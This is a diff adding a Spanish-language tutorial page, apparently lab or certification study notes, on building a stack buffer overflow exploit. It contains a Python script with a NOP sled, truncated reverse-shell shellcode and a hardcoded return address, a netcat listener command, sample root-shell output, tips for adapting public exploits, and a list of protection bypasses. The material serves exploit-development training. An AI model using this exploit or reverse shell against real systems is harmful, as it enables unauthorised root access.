@@ -1,0 +1,97 @@
+# Proof-of-Concept
+
+Ahora que tenemos todos los componentes, podemos crear el exploit funcional.
+
+## Componentes del Exploit
+
+| Componente | Tamaño | Contenido |
+|------------|--------|-----------|
+| Buffer | 817 bytes | Padding |
+| NOPs | 124 bytes | NOP sled |
+| Shellcode | 95 bytes | Reverse shell |
+| EIP | 4 bytes | Dirección de retorno |
+
+## Exploit Python
+
+```python
+#!/usr/bin/env python
+# buffer_overflow_exploit.py
+
+# Padding
+buffer = "\x55" * 817
+
+# NOP sled
+nops = "\x90" * 124
+
+# Shellcode (reverse shell)
+shellcode = (
+    "\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+    "\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
+    "\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
+    # ... resto del shellcode (95 bytes total)
+)
+
+# Return address (little-endian)
+eip = "\xf0\xd5\xff\xff"
+
+# Payload completo
+payload = buffer + nops + shellcode + eip
+
+print payload
+```
+
+## Ejecutar el Exploit
+
+```bash
+# En la máquina atacante - escuchar conexiones
+nc -lvnp 31337
+
+# Ejecutar exploit
+./bow $(python buffer_overflow_exploit.py)
+```
+
+## Verificar Conexión
+
+```
+listening on [any] 31337 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 12345
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## Modificación de Exploits Públicos
+
+Cuando modificamos exploits públicos:
+
+1. **Verificar arquitectura** - x86 vs x64
+2. **Identificar offset** - Puede variar
+3. **Bad characters** - Pueden diferir
+4. **Dirección de retorno** - Calcular para el sistema objetivo
+5. **Shellcode** - Ajustar LHOST y LPORT
+
+## Consideraciones de Producción
+
+| Factor | Impacto |
+|--------|---------|
+| ASLR habilitado | Direcciones randomizadas |
+| DEP activo | Stack no ejecutable |
+| Stack canary | Detección de overflow |
+| PIE | Código en direcciones variables |
+
+## Bypass de Protecciones
+
+| Protección | Bypass |
+|------------|--------|
+| ASLR | Info leak, brute force |
+| DEP | ROP chains |
+| Stack Canary | Info leak del canary |
+| PIE | Info leak de direcciones |
+
+## Cleanup
+
+Después de explotar:
+
+1. Restaurar ASLR si se deshabilitó
+2. Documentar el exploit
+3. Limpiar archivos temporales
+4. Reportar la vulnerabilidad
